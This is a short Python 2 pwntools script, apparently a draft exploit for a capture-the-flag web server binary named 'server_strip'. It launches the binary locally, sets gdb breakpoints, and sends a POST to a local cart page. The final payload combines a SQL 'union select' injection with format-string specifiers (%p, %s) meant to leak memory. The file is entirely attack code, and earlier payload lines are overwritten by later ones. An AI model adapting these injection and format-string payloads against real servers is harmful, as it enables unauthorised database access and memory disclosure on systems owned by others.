from pwn import *
import sys
import requests
if len(sys.argv) < 2:
	p = process("./server_strip")

def debugf():
	gdb.attach(p,"b *0x402B21\nb *0x402bf2\nb *0x402DDA")

headers = {"Host": "127.0.0.1",
"Content-Length": "84",
"Content-Type": "application/x-www-form-urlencoded"
}
payload = "admin" + "a"*(0x40-5-5) + "nimda"
payload = "aa=bb111111111&cargo=1111) union select ('dadadadasdasdadasdads%paaaaaaaa%sasasaaaa'"
payload = {"aa":"bb111111111","cargo":"1111) union select ('dadadadasdasdadasdads%paaaaaaaa%sasasaaaa'"}
r = requests.post('http://127.0.0.1:8080/cart.html',params=payload,headers=headers)#,headers=headers)
print r.content
